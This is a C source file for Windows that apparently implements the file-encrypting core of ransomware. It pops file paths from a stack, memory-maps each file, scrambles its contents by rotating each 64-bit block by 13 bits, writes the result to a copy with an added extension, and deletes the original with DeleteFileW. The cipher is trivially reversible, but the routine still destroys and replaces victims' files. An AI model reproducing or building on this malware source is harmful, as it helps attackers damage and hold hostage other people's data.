#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <windows.h>
#include "encrypt.h"
#include "stack.h"

static inline void lr13(uint64_t *data) {
    *data = (*data << 13) | (*data >> (64 - 13));
}

static inline void lr13_reverse(uint64_t *data) {
    *data = (*data >> 13) | (*data << (64 - 13));
}

wchar_t *add_extension(wchar_t *file_path) {
    if(file_path == NULL) return NULL;
    wchar_t *output;
    wchar_t ext[] = EXT;
    size_t file_len = wcslen(file_path);
    size_t ext_len = wcslen(ext);

    if(file_len + ext_len + 1 > 260) return NULL;

    output = calloc(file_len + ext_len + 1, sizeof(wchar_t));
    if(output == NULL) return NULL;

    wcscpy(output, file_path);
    wcscat(output, ext);
    return output;
}

void encrypt_data(LPCVOID p_src, LPVOID p_dest, DWORD file_size) {
    uint64_t *src_data = (uint64_t *)p_src;
    uint64_t *dest_data = (uint64_t *)p_dest;
    size_t num_blocks = file_size / sizeof(uint64_t);

    for(size_t i = 0; i < num_blocks; ++i) {
        dest_data[i] = src_data[i];
        lr13(&dest_data[i]);
    }

    size_t remaining_bytes = file_size % sizeof(uint64_t);
    if(remaining_bytes > 0) {
        const char *src_tail = (const char *)(src_data + num_blocks);
        char *dest_tail = (char *)(dest_data + num_blocks);
        for(size_t i = 0; i < remaining_bytes; i++) {
            dest_tail[i] = src_tail[i];
        }
    }
}

void encrypt_stack(struct Stack *files_stack) {
    while(!stack_is_empty(files_stack)) {
        wchar_t *file, *output_file;
        HANDLE h_file, h_map, h_dest_file, h_dest_map;
        LPCVOID p_src;
        LPVOID p_dest;
        DWORD file_size;
        
        file = (wchar_t *)stack_pop(files_stack);
        if((output_file = add_extension(file)) == NULL) {
            free(file);
            return;
        }

        h_file = CreateFileW(file, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
        if(h_file == INVALID_HANDLE_VALUE) {
            free(file);
            return;
        }

        file_size = GetFileSize(h_file, NULL);
        if(file_size == INVALID_FILE_SIZE) {
            CloseHandle(h_file);
            free(file);
            return;
        }

        h_map = CreateFileMappingA(h_file,  NULL, PAGE_READONLY, 0, 0, NULL);
        if(h_map == NULL) {
            CloseHandle(h_file);
            free(file);
            return;
        }

        p_src = MapViewOfFile(h_map, FILE_MAP_READ, 0, 0, 0);
        if(p_src == NULL) {
            CloseHandle(h_map);
            CloseHandle(h_file);
            free(file);
            return;
        }

        h_dest_file = CreateFileW(output_file, GENERIC_READ | GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if(h_dest_file == INVALID_HANDLE_VALUE) {
            CloseHandle(h_map);
            CloseHandle(h_file);
            free(file);
            return;
        }

        h_dest_map = CreateFileMappingA(h_dest_file, NULL, PAGE_READWRITE, 0, file_size, NULL);
        if(h_dest_map == NULL) {
            CloseHandle(h_dest_file);
            CloseHandle(h_map);
            CloseHandle(h_file);
            free(file);
            return;
        }

        p_dest = MapViewOfFile(h_dest_map, FILE_MAP_WRITE, 0, 0, file_size);
        if(p_dest == NULL) {
            CloseHandle(h_dest_map);
            CloseHandle(h_dest_file);
            CloseHandle(h_map);
            CloseHandle(h_file);
            free(file);
            return;
        }

        encrypt_data(p_src, p_dest, file_size);

        UnmapViewOfFile(p_dest);
        CloseHandle(h_dest_map);
        CloseHandle(h_dest_file);

        UnmapViewOfFile(p_src);
        CloseHandle(h_map);
        CloseHandle(h_file);
        
        DeleteFileW(file);

        free(output_file);
        free(file);
    }
}
